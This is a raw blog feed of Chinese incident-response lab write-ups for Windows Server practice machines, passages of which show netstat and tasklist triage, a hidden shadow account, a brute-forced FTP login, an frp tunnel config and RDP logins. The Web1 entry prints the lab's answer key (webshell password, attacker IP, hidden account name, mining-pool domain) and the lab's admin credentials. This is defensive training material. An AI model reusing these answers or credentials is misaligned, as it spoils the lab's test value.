[::]:5353              *:*                                    1784</span><br><span class="line">  UDP    [::]:5355              *:*                                    1784</span><br><span class="line">  UDP    [::]:49647             *:*                                    1784</span><br><span class="line">  UDP    [fe80::d13e:e5f7:d2c:e4d0%4]:546  *:*                                    1388</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407101549561.png" data-fancybox="true"/></div></div><h3 id="查看服务"><a href="#查看服务" class="headerlink" title="查看服务"></a>查看服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;tasklist /svc</span><br><span class="line"></span><br><span class="line">映像名称                       PID 服务</span><br><span class="line">========================= ======== ============================================</span><br><span class="line">System Idle Process              0 暂缺</span><br><span class="line">System                           4 暂缺</span><br><span class="line">Registry                       100 暂缺</span><br><span class="line">smss.exe                       332 暂缺</span><br><span class="line">csrss.exe                      420 暂缺</span><br><span class="line">wininit.exe                    516 暂缺</span><br><span class="line">csrss.exe                      524 暂缺</span><br><span class="line">winlogon.exe                   580 暂缺</span><br><span class="line">services.exe                   652 暂缺</span><br><span class="line">lsass.exe                      672 KeyIso, SamSs</span><br><span class="line">svchost.exe                    780 BrokerInfrastructure, DcomLaunch, PlugPlay,</span><br><span class="line">                                   Power, SystemEventsBroker</span><br><span class="line">fontdrvhost.exe                800 暂缺</span><br><span class="line">fontdrvhost.exe                808 暂缺</span><br><span class="line">svchost.exe                    892 RpcEptMapper, RpcSs</span><br><span class="line">svchost.exe                    944 LSM</span><br><span class="line">svchost.exe                   1020 TermService</span><br><span class="line">dwm.exe                        348 暂缺</span><br><span class="line">svchost.exe                    380 ClipSVC</span><br><span class="line">svchost.exe                    688 NcbService</span><br><span class="line">svchost.exe                    648 lmhosts</span><br><span class="line">svchost.exe                    884 TimeBrokerSvc</span><br><span class="line">svchost.exe                   1060 CoreMessagingRegistrar</span><br><span class="line">svchost.exe                   1184 EventLog</span><br><span class="line">svchost.exe                   1232 DispBrokerDesktopSvc</span><br><span class="line">svchost.exe                   1252 WPDBusEnum</span><br><span class="line">svchost.exe                   1268 nsi</span><br><span class="line">svchost.exe                   1380 UmRdpService</span><br><span class="line">svchost.exe                   1388 Dhcp</span><br><span class="line">svchost.exe                   1408 gpsvc</span><br><span class="line">svchost.exe                   1420 ProfSvc</span><br><span class="line">svchost.exe                   1460 EventSystem</span><br><span class="line">svchost.exe                   1468 Themes</span><br><span class="line">svchost.exe                   1640 NlaSvc</span><br><span class="line">svchost.exe                   1648 CertPropSvc</span><br><span class="line">svchost.exe                   1724 SENS</span><br><span class="line">svchost.exe                   1748 LanmanWorkstation</span><br><span class="line">svchost.exe                   1772 Schedule</span><br><span class="line">svchost.exe                   1784 Dnscache</span><br><span class="line">svchost.exe                   1800 Wcmsvc</span><br><span class="line">svchost.exe                   1876 ShellHWDetection</span><br><span class="line">svchost.exe                   1908 netprofm</span><br><span class="line">svchost.exe                   1960 WinHttpAutoProxySvc</span><br><span class="line">svchost.exe                   1972 FontCache</span><br><span class="line">svchost.exe                   2024 BFE, mpssvc</span><br><span class="line">svchost.exe                    696 SessionEnv</span><br><span class="line">svchost.exe                   2052 wlidsvc</span><br><span class="line">spoolsv.exe                   2368 Spooler</span><br><span class="line">svchost.exe                   2396 UserManager</span><br><span class="line">svchost.exe                   2400 PolicyAgent</span><br><span class="line">svchost.exe                   2412 IKEEXT</span><br><span class="line">svchost.exe                   2432 CryptSvc</span><br><span class="line">svchost.exe                   2452 DiagTrack</span><br><span class="line">svchost.exe                   2488 iphlpsvc</span><br><span class="line">phpStudyServer.exe            2588 phpStudySrv</span><br><span class="line">svchost.exe                   2608 RemoteRegistry</span><br><span class="line">svchost.exe                   2616 StateRepository</span><br><span class="line">svchost.exe                   2628 LanmanServer</span><br><span class="line">svchost.exe                   2648 SysMain</span><br><span class="line">VGAuthService.exe             2720 VGAuthService</span><br><span class="line">vm3dservice.exe               2728 vm3dservice</span><br><span class="line">vmtoolsd.exe                  2740 VMTools</span><br><span class="line">svchost.exe                   2756 W32Time</span><br><span class="line">svchost.exe                   2776 TrkWks</span><br><span class="line">MsMpEng.exe                   2812 WinDefend</span><br><span class="line">svchost.exe                   2848 Winmgmt</span><br><span class="line">svchost.exe                   2936 WinRM</span><br><span class="line">svchost.exe                   2944 WpnService</span><br><span class="line">vm3dservice.exe               3040 暂缺</span><br><span class="line">dllhost.exe                   3292 vmvss</span><br><span class="line">dllhost.exe                   3440 COMSysApp</span><br><span class="line">AggregatorHost.exe            3476 暂缺</span><br><span class="line">WmiPrvSE.exe                  3668 暂缺</span><br><span class="line">msdtc.exe                     4020 MSDTC</span><br><span class="line">sppsvc.exe                    3332 sppsvc</span><br><span class="line">SppExtComObj.Exe              3968 暂缺</span><br><span class="line">slui.exe                      3660 暂缺</span><br><span class="line">svchost.exe                   3900 LicenseManager</span><br><span class="line">slui.exe                      3612 暂缺</span><br><span class="line">svchost.exe                   4136 wuauserv</span><br><span class="line">VSSVC.exe                     4252 VSS</span><br><span class="line">svchost.exe                   4464 DeviceInstall</span><br><span class="line">MpCmdRun.exe                  4632 暂缺</span><br><span class="line">conhost.exe                   4640 暂缺</span><br><span class="line">TrustedInstaller.exe          4868 TrustedInstaller</span><br><span class="line">TiWorker.exe                  4904 暂缺</span><br><span class="line">svchost.exe                   4972 DoSvc</span><br><span class="line">svchost.exe                   5068 StorSvc</span><br><span class="line">svchost.exe                   3460 AppXSvc</span><br><span class="line">WmiPrvSE.exe                  3388 暂缺</span><br><span class="line">svchost.exe                   5132 BITS</span><br><span class="line">WmiApSrv.exe                  5340 wmiApSrv</span><br><span class="line">sihost.exe                    5468 暂缺</span><br><span class="line">svchost.exe                   5476 CDPUserSvc_610b2</span><br><span class="line">svchost.exe                   5504 WpnUserService_610b2</span><br><span class="line">taskhostw.exe                 5596 暂缺</span><br><span class="line">svchost.exe                   5660 TokenBroker</span><br><span class="line">svchost.exe                   5736 TabletInputService</span><br><span class="line">ctfmon.exe                    5772 暂缺</span><br><span class="line">svchost.exe                   5904 CDPSvc</span><br><span class="line">svchost.exe                   5912 camsvc</span><br><span class="line">explorer.exe                  6048 暂缺</span><br><span class="line">slui.exe                      4544 暂缺</span><br><span class="line">StartMenuExperienceHost.e     5656 暂缺</span><br><span class="line">TextInputHost.exe             5652 暂缺</span><br><span class="line">RuntimeBroker.exe             6208 暂缺</span><br><span class="line">ChsIME.exe                    6392 暂缺</span><br><span class="line">SearchApp.exe                 6468 暂缺</span><br><span class="line">RuntimeBroker.exe             6640 暂缺</span><br><span class="line">RuntimeBroker.exe             6972 暂缺</span><br><span class="line">WmiPrvSE.exe                  7144 暂缺</span><br><span class="line">svchost.exe                   6348 NetSetupSvc</span><br><span class="line">cmd.exe                       1032 暂缺</span><br><span class="line">conhost.exe                   1116 暂缺</span><br><span class="line">vmtoolsd.exe                  2716 暂缺</span><br><span class="line">MpCmdRun.exe                  6748 暂缺</span><br><span class="line">conhost.exe                   6792 暂缺</span><br><span class="line">MicrosoftEdgeUpdate.exe       1504 暂缺</span><br><span class="line">MicrosoftEdgeUpdate.exe       1792 暂缺</span><br><span class="line">MicrosoftEdgeUpdate.exe       2476 edgeupdate</span><br><span class="line">mpam-fe.exe                   7032 暂缺</span><br><span class="line">tasklist.exe                  3652 暂缺</span><br></pre></td></tr></table></figure><h3 id="查看账号"><a href="#查看账号" class="headerlink" title="查看账号"></a>查看账号</h3><p><code>win+r</code>:<code>lusrmgr.msc</code>发现一个影子账户:<code>hack887$</code>或<code>net localgroup administrators</code>只能查看通过<code>$</code>符号隐藏的账户</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407101549998.png" data-fancybox="true"/></div></div><p>查看该用户相关文件</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407101550827.png" data-fancybox="true"/></div></div><p>在该用户桌面路径下两个注册表文件.疑似是用来创建影子账户用的,那我们使用<code>net local administrators</code>命令验证一下.确定为影子账户</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407101550527.png" data-fancybox="true"/></div></div><h3 id="分析开机自启程序"><a href="#分析开机自启程序" class="headerlink" title="分析开机自启程序"></a>分析开机自启程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msconfig 启动选项卡</span><br><span class="line">gpedit.msc 组策略编辑器</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407101550315.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407101550914.png" data-fancybox="true"/></div></div><h3 id="查看计划或定时任务"><a href="#查看计划或定时任务" class="headerlink" title="查看计划或定时任务"></a>查看计划或定时任务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks</span><br><span class="line">taskschd.msc</span><br><span class="line">compmgmt.msc</span><br></pre></td></tr></table></figure><h2 id="Web应急响应"><a href="#Web应急响应" class="headerlink" title="Web应急响应"></a>Web应急响应</h2><p>开着PHPStudy那估计就会有web服务器,虽然背景中也说了,进入网站根目录,查找是否存在Webshell,或通过<code>%UserProfile%\Recent</code>查找最近修改的文件记录</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407101550942.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407101550150.png" data-fancybox="true"/></div></div><p>通过路径也可确定该CMS为WordPress.排查相关中间件日志并未发现攻击路径.并且是直接Get访问的该文件.从其他服务下手</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407101550362.png" data-fancybox="true"/></div></div><h2 id="Ftp应急响应"><a href="#Ftp应急响应" class="headerlink" title="Ftp应急响应"></a>Ftp应急响应</h2><p>通过PHPStudy发现该系统对外开放了ftp服务,并且为弱密码。目录也是网站根目录</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407101550357.png" data-fancybox="true"/></div></div><p>找到该服务的目录,查询相关日志文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ftp 相关状态码</span></span><br><span class="line">220 服务准备就绪，可以执行新用户的请求</span><br><span class="line">226 关闭数据连接，请求的文件操作已成功。</span><br><span class="line">230 用户已经登录成功</span><br><span class="line">331 用户名正确，需要密码。</span><br><span class="line">421 服务不可用，关闭控制连接</span><br><span class="line">530 未登录</span><br></pre></td></tr></table></figure><p>发现暴力破解登录成功,并上传了恶意文件</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407101550875.png" data-fancybox="true"/></div></div><h2 id="Frp文件分析"><a href="#Frp文件分析" class="headerlink" title="Frp文件分析"></a>Frp文件分析</h2><p>我们在最近打开的文件中发现了<code>frp</code>相关的东西.<code>ini</code>文件是旧版<code>frp</code>的配置文件<code>toml</code>是新版<code>frp</code>的配置文件,都查看一下.发现了伪服务器的IP和端口</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407101550462.png" data-fancybox="true"/></div></div><p><code>Tencent Files</code>文件夹名是腾讯用来存放<code>QQ</code>及<code>WeChat</code>的聊天记录及文件的.所以可以猜测这是攻击者的<code>QQ</code>号</p><h2 id="系统应急响应"><a href="#系统应急响应" class="headerlink" title="系统应急响应"></a>系统应急响应</h2><p>通过<code>eventvwr</code>查看用户创建日志,发现是直接通过administrator管理员用户创建的影子账户.</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407101550575.png" data-fancybox="true"/></div></div><p>发现此用户通过RDP远程登陆了此机器</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407101550437.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407101550525.png" data-fancybox="true"/></div></div><h2 id="攻击路径"><a href="#攻击路径" class="headerlink" title="攻击路径"></a>攻击路径</h2><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407150929906.png" data-fancybox="true"/></div></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="应急响应" scheme="https://jiangjiyue.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="Windows" scheme="https://jiangjiyue.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>应急响应靶机训练-Web1</title>
    <link href="https://jiangjiyue.github.io/2024/07/09/69563a36/"/>
    <id>https://jiangjiyue.github.io/2024/07/09/69563a36/</id>
    <published>2024-07-09T10:34:49.000Z</published>
    <updated>2024-07-25T16:32:12.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 23.16K</p>    </div>    <div class="cell" style="">    <p>代码: 7.40K, 文本: 3.64K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 48 分钟</p>    </div>    </div><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>小李在值守的过程中,发现有CPU占用飙升,出于胆子小,就立刻将服务器关机,并找来正在吃苕皮的hxd帮他分析,这是他的服务器系统,请你找出以下内容:</p><ol><li><p>攻击者的shell密码: <psw>rebeyond</psw></p></li><li><p>攻击者的IP地址: <psw>192.168.126.1</psw></p></li><li><p>攻击者的隐藏账户名称: <psw>hack168$</psw></p></li><li><p>攻击者挖矿程序的矿池域名(仅域名): <psw>http://wakuang.zhigongshanfang.top</psw></p></li><li><p>修复漏洞</p></li></ol><h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><p>使用Vmware启动即可,如启动错误,请升级至Vmware17.5以上</p><p>靶机环境：</p><ol><li><p>Windows Server 2022</p></li><li><p>phpstudy(小皮面板)</p></li></ol><p>相关账户密码:</p><ol><li><p>用户:administrator</p></li><li><p>密码:<a href="mailto:&#90;&#x67;&#115;&#x66;&#64;&#97;&#100;&#109;&#x69;&#x6e;&#x2e;&#x63;&#111;&#x6d;">&#90;&#x67;&#115;&#x66;&#64;&#97;&#100;&#109;&#x69;&#x6e;&#x2e;&#x63;&#111;&#x6d;</a></p></li></ol><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看运行了哪些服务,有无外联端口</span></span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line"><span class="comment"># TCP 连接</span></span><br><span class="line"><span class="comment"># 监听端口 (LISTENING)</span></span><br><span class="line">135端口：通常用于 Windows RPC(远程过程调用)服务,PID 为 884.</span><br><span class="line">445端口：用于 SMB(Server Message Block)协议,通常用于文件和打印机共享,PID 为 4.</span><br><span class="line">3389端口：用于 RDP(远程桌面协议),PID 为 1012.</span><br><span class="line">5357端口：通常用于 Web Services <span class="keyword">for</span> Devices (WSDAPI),PID 为 4.</span><br><span class="line">5985端口：用于 WinRM (Windows Remote Management) over HTTP,PID 为 4.</span><br><span class="line">47001端口：通常用于 Windows 的自动发现服务,PID 为 4.</span><br><span class="line">49664-49671端口：这些是动态或私有端口,用于各种系统服务,PID 分别为 672, 512, 1132, 1656, 2084, 2428, 648, 2308.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已建立连接 (ESTABLISHED)</span></span><br><span class="line">49809和49810端口：与 124.152.197.78 的 80 端口建立连接,PID 为 7512.</span><br><span class="line">49850和49851端口：与 40.126.35.80 和 119.167.147.35 的 443 端口建立连接,PID 为 3652.</span><br><span class="line">等待关闭连接 (TIME_WAIT)</span><br><span class="line"></span><br><span class="line">49802, 49808, 49849, 49853, 49855, 49856, 49858, 49859端口：这些连接正在等待关闭,PID 为 0.</span><br><span class="line"><span class="comment"># UDP 连接</span></span><br><span class="line"><span class="comment"># 监听端口</span></span><br><span class="line">123端口：用于 NTP(网络时间协议),PID 为 2860.</span><br><span class="line">500端口：用于 IPSec 的 ISAKMP(Internet Security Association and Key Management Protocol),PID 为 2300.</span><br><span class="line">3389端口：用于 RDP 的 UDP 通信,PID 为 1012.</span><br><span class="line">3702端口：用于 Web Services Discovery,PID 为 7032.</span><br><span class="line">4500端口：用于 NAT-T(Network Address Translation - Traversal),PID 为 2300.</span><br><span class="line">5353端口：用于 mDNS(Multicast DNS),PID 为 1764.</span><br><span class="line">5355端口：用于 LLMNR(Link-Local Multicast Name Resolution),PID 为 1764.</span><br><span class="line">58668和58669端口：动态端口,PID 为 7032.</span><br><span class="line">127.0.0.1:59524：本地回环地址上的通信,PID 为 2560.</span><br><span class="line">192.168.150.176:137和138端口：用于 NetBIOS 名称和数据报服务,PID 为 4.</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031837719.png" data-fancybox="true"/></div></div><h3 id="查看服务"><a href="#查看服务" class="headerlink" title="查看服务"></a>查看服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;tasklist /svc</span><br><span class="line"></span><br><span class="line">映像名称                       PID 服务</span><br><span class="line">========================= ======== ============================================</span><br><span class="line">System Idle Process              0 暂缺</span><br><span class="line">System                           4 暂缺</span><br><span class="line">Registry                       100 暂缺</span><br><span class="line">smss.exe                       300 暂缺</span><br><span class="line">csrss.exe                      416 暂缺</span><br><span class="line">wininit.exe                    512 暂缺</span><br><span class="line">csrss.exe                      520 暂缺</span><br><span class="line">winlogon.exe                   576 暂缺</span><br><span class="line">services.exe                   648 暂缺</span><br><span class="line">lsass.exe                      672 KeyIso, SamSs</span><br><span class="line">svchost.exe                    768 BrokerInfrastructure, DcomLaunch, PlugPlay,</span><br><span class="line">                                   Power, SystemEventsBroker</span><br><span class="line">fontdrvhost.exe                784 暂缺</span><br><span class="line">fontdrvhost.exe                792 暂缺</span><br><span class="line">svchost.exe                    884 RpcEptMapper, RpcSs</span><br><span class="line">svchost.exe                    944 LSM</span><br><span class="line">svchost.exe                   1012 TermService</span><br><span class="line">dwm.exe                        380 暂缺</span><br><span class="line">svchost.exe                    692 NcbService</span><br><span class="line">svchost.exe                    936 lmhosts</span><br><span class="line">svchost.exe                    352 TimeBrokerSvc</span><br><span class="line">svchost.exe                   1132 EventLog</span><br><span class="line">svchost.exe                   1140 CoreMessagingRegistrar</span><br><span class="line">svchost.exe                   1296 nsi</span><br><span class="line">svchost.exe                   1308 gpsvc</span><br><span class="line">svchost.exe                   1336 ProfSvc</span><br><span class="line">svchost.exe                   1344 FontCache</span><br><span class="line">svchost.exe                   1380 EventSystem</span><br><span class="line">svchost.exe                   1396 UmRdpService</span><br><span class="line">svchost.exe                   1412 Themes</span><br><span class="line">svchost.exe                   1420 DispBrokerDesktopSvc</span><br><span class="line">svchost.exe                   1528 Dhcp</span><br><span class="line">svchost.exe                   1632 SENS</span><br><span class="line">svchost.exe                   1656 Schedule</span><br><span class="line">svchost.exe                   1764 Dnscache</span><br><span class="line">svchost.exe                   1772 Wcmsvc</span><br><span class="line">svchost.exe                   1856 NlaSvc</span><br><span class="line">svchost.exe                   1872 ShellHWDetection</span><br><span class="line">svchost.exe                   1884 CertPropSvc</span><br><span class="line">svchost.exe                   1956 BFE, mpssvc</span><br><span class="line">svchost.exe                   1976 LanmanWorkstation</span><br><span class="line">svchost.exe                   1988 WinHttpAutoProxySvc</span><br><span class="line">svchost.exe                   2084 SessionEnv</span><br><span class="line">svchost.exe                   2100 netprofm</span><br><span class="line">svchost.exe                   2220 UserManager</span><br><span class="line">svchost.exe                   2300 IKEEXT</span><br><span class="line">svchost.exe                   2308 PolicyAgent</span><br><span class="line">spoolsv.exe                   2428 Spooler</span><br><span class="line">svchost.exe                   2512 CryptSvc</span><br><span class="line">svchost.exe                   2524 DiagTrack</span><br><span class="line">svchost.exe                   2560 iphlpsvc</span><br><span class="line">svchost.exe                   2608 LanmanServer</span><br><span class="line">phpStudyServer.exe            2624 phpStudySrv</span><br><span class="line">svchost.exe                   2640 SstpSvc</span><br><span class="line">svchost.exe                   2680 StateRepository</span><br><span class="line">svchost.exe                   2688 SysMain</span><br><span class="line">svchost.exe                   2744 TrkWks</span><br><span class="line">VGAuthService.exe             2768 VGAuthService</span><br><span class="line">vm3dservice.exe               2804 vm3dservice</span><br><span class="line">vmtoolsd.exe                  2848 VMTools</span><br><span class="line">svchost.exe                   2860 W32Time</span><br><span class="line">MsMpEng.exe                   2868 WinDefend</span><br><span class="line">svchost.exe                   2884 Winmgmt</span><br><span class="line">svchost.exe                   2908 WinRM</span><br><span class="line">svchost.exe                   2940 WpnService</span><br><span class="line">vm3dservice.exe               2592 暂缺</span><br><span class="line">svchost.exe                   3356 RasMan</span><br><span class="line">AggregatorHost.exe            3668 暂缺</span><br><span class="line">dllhost.exe                   3696 COMSysApp</span><br><span class="line">WmiPrvSE.exe                  4132 暂缺</span><br><span class="line">sihost.exe                    4212 暂缺</span><br><span class="line">svchost.exe                   4224 CDPUserSvc_37c8d</span><br><span class="line">svchost.exe                   4256 WpnUserService_37c8d</span><br><span class="line">taskhostw.exe                 4360 暂缺</span><br><span class="line">svchost.exe                   4472 TokenBroker</span><br><span class="line">svchost.exe                   4540 TabletInputService</span><br><span class="line">ctfmon.exe                    4628 暂缺</span><br><span class="line">svchost.exe                   4668 AppXSvc</span><br><span class="line">svchost.exe                   4748 camsvc</span><br><span class="line">svchost.exe                   4792 CDPSvc</span><br><span class="line">NisSrv.exe                    3616 WdNisSvc</span><br><span class="line">explorer.exe                  1092 暂缺</span><br><span class="line">ChsIME.exe                    4588 暂缺</span><br><span class="line">svchost.exe                   5180 wuauserv</span><br><span class="line">msdtc.exe                     5188 MSDTC</span><br><span class="line">TextInputHost.exe             5500 暂缺</span><br><span class="line">StartMenuExperienceHost.e     5524 暂缺</span><br><span class="line">RuntimeBroker.exe             5700 暂缺</span><br><span class="line">SearchApp.exe                 5944 暂缺</span><br><span class="line">RuntimeBroker.exe             6128 暂缺</span><br><span class="line">RuntimeBroker.exe             6308 暂缺</span><br><span 